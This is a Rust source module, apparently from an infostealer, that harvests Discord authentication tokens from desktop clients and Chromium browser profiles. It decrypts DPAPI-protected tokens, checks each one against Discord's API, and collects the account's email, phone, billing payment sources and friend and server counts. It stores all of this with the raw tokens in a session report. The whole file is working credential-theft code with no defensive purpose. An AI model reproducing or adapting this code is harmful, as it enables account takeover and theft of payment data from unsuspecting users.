//! Discord token discovery.
//!
//! Desktop clients and every Chromium profile keep the token inside a LevelDB
//! under `Local Storage\leveldb`. Recent clients wrap the token in a DPAPI blob
//! prefixed with `dQw4w9WgXcQ:`; older ones store it in clear text. Both forms
//! are handled, then each candidate is checked against `/users/@me`.

use std::fs;
use std::path::{Path, PathBuf};

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine as _;
use regex::Regex;
use std::sync::OnceLock;

use crate::browsers::chromium;
use crate::crypto;
use crate::session::Session;
use crate::util;

const DISCORD_APPS: &[&str] = &[
    "discord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
    "Lightcord",
    "Discord",
];

const DPAPI_MARKER: &[u8] = b"dQw4w9WgXcQ:";

fn token_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(mfa\.[a-z0-9_-]{80,130}|[a-z0-9_-]{20,32}\.[a-z0-9_-]{5,8}\.[a-z0-9_-]{20,60})")
            .expect("token regex")
    })
}

fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn harvest_bytes(data: &[u8], source: &str, out: &mut Vec<(String, String)>) {
    let text = String::from_utf8_lossy(data);
    for hit in token_regex().find_iter(&text) {
        out.push((hit.as_str().to_string(), source.to_string()));
    }

    let mut cursor = 0usize;
    while let Some(offset) = find(&data[cursor..], DPAPI_MARKER) {
        let start = cursor + offset + DPAPI_MARKER.len();
        let end = data[start..]
            .iter()
            .position(|b| !(b.is_ascii_alphanumeric() || *b == b'=' || *b == b'+' || *b == b'/'))
            .map(|len| start + len)
            .unwrap_or(data.len());
        if end > start {
            if let Ok(blob) = B64.decode(&data[start..end]) {
                if let Some(plain) = crypto::dpapi(&blob) {
                    let inner = String::from_utf8_lossy(&plain);
                    for hit in token_regex().find_iter(&inner) {
                        out.push((hit.as_str().to_string(), format!("{source} (dpapi)")));
                    }
                }
            }
        }
        cursor = end.max(cursor + 1);
        if cursor >= data.len() {
            break;
        }
    }
}

fn scan_leveldb(dir: &Path, source: &str, out: &mut Vec<(String, String)>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let name = path
            .file_name()
            .map(|n| n.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        if !(name.ends_with(".ldb") || name.ends_with(".log")) {
            continue;
        }
        if let Some(data) = util::read(&path) {
            harvest_bytes(&data, source, out);
        }
    }
}

fn desktop_sources() -> Vec<(String, PathBuf)> {
    let mut out = Vec::new();
    let Some(roaming) = util::env_path("APPDATA") else {
        return out;
    };
    for app in DISCORD_APPS {
        let base = roaming.join(app);
        if !base.is_dir() {
            continue;
        }
        out.push(((*app).to_string(), base.join(r"Local Storage\leveldb")));
        out.push((
            format!("{app}/ptb"),
            base.join(r"Local Storage\leveldb"),
        ));
    }
    out
}

fn browser_sources() -> Vec<(String, PathBuf)> {
    let mut out = Vec::new();
    for root in chromium::roots() {
        for profile in chromium::profile_dirs(&root.path) {
            let label = profile
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| String::from("Default"));
            out.push((
                format!("{} ({label})", root.name),
                profile.join(r"Local Storage\leveldb"),
            ));
        }
    }
    out
}

fn client() -> Option<reqwest::blocking::Client> {
    reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(15))
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()
        .ok()
}

fn get_json(client: &reqwest::blocking::Client, token: &str, url: &str) -> Option<serde_json::Value> {
    let response = client
        .get(url)
        .header("Authorization", token)
        .header("Content-Type", "application/json")
        .send()
        .ok()?;
    if !response.status().is_success() {
        return None;
    }
    response.json::<serde_json::Value>().ok()
}

fn account_summary(profile: &serde_json::Value) -> String {
    let username = profile.get("username").and_then(|v| v.as_str()).unwrap_or("?");
    let discriminator = profile
        .get("discriminator")
        .and_then(|v| v.as_str())
        .unwrap_or("0");
    let id = profile.get("id").and_then(|v| v.as_str()).unwrap_or("?");
    if discriminator == "0" {
        format!("{username} ({id})")
    } else {
        format!("{username}#{discriminator} ({id})")
    }
}

pub fn collect(session: &mut Session) {
    let mut candidates: Vec<(String, String)> = Vec::new();

    for (source, dir) in desktop_sources() {
        scan_leveldb(&dir, &source, &mut candidates);
    }
    for (source, dir) in browser_sources() {
        scan_leveldb(&dir, &source, &mut candidates);
    }

    // Deduplicate while keeping the first source that produced a token.
    let mut seen = std::collections::HashSet::new();
    candidates.retain(|(token, _)| seen.insert(token.clone()));

    if candidates.is_empty() {
        session.note("discord: no tokens found");
        return;
    }
    session.note(&format!("discord: {} candidate tokens", candidates.len()));

    let Some(client) = client() else {
        session.note("discord: no http client");
        return;
    };

    let mut report = format!("# discord tokens — {}\n\n", util::timestamp());
    let mut valid = 0usize;

    for (token, source) in &candidates {
        let Some(profile) = get_json(&client, token, "https://discord.com/api/v9/users/@me") else {
            report.push_str(&format!("[invalid] {source}\n{token}\n\n"));
            continue;
        };
        valid += 1;

        let summary = account_summary(&profile);
        let billing = get_json(
            &client,
            token,
            "https://discord.com/api/v9/users/@me/billing/payment-sources",
        )
        .unwrap_or(serde_json::Value::Null);
        let guilds = get_json(&client, token, "https://discord.com/api/v9/users/@me/guilds")
            .and_then(|v| v.as_array().map(|a| a.len()))
            .unwrap_or(0);
        let relationships = get_json(
            &client,
            token,
            "https://discord.com/api/v9/users/@me/relationships",
        )
        .and_then(|v| v.as_array().map(|a| a.len()))
        .unwrap_or(0);

        let mut account = serde_json::Map::new();
        account.insert("token".into(), serde_json::Value::String(token.clone()));
        account.insert("source".into(), serde_json::Value::String(source.clone()));
        account.insert("profile".into(), profile.clone());
        account.insert("billing".into(), billing.clone());
        account.insert("guilds".into(), serde_json::json!(guilds));
        account.insert("friends".into(), serde_json::json!(relationships));

        let body = serde_json::to_string_pretty(&serde_json::Value::Object(account))
            .unwrap_or_default();
        let id = profile.get("id").and_then(|v| v.as_str()).unwrap_or("unknown");
        session.put_text(&format!("discord/{id}.json"), &body);

        let email = profile.get("email").and_then(|v| v.as_str()).unwrap_or("-");
        let phone = profile.get("phone").and_then(|v| v.as_str()).unwrap_or("-");
        let nitro = profile
            .get("premium_type")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        let mfa = profile.get("mfa_enabled").and_then(|v| v.as_bool()).unwrap_or(false);

        report.push_str(&format!("[valid] {summary}\n"));
        report.push_str(&format!("  source   {source}\n"));
        report.push_str(&format!("  email    {email}\n"));
        report.push_str(&format!("  phone    {phone}\n"));
        report.push_str(&format!("  nitro    {nitro}\n"));
        report.push_str(&format!("  mfa      {mfa}\n"));
        report.push_str(&format!("  guilds   {guilds}\n"));
        report.push_str(&format!("  friends  {relationships}\n"));
        report.push_str(&format!("  token    {token}\n\n"));

        session.line(&format!("discord: {summary} nitro={nitro}"));
    }

    session.put_text("discord/tokens.txt", &report);
    session.note(&format!("discord: {valid} valid of {} tokens", candidates.len()));
}
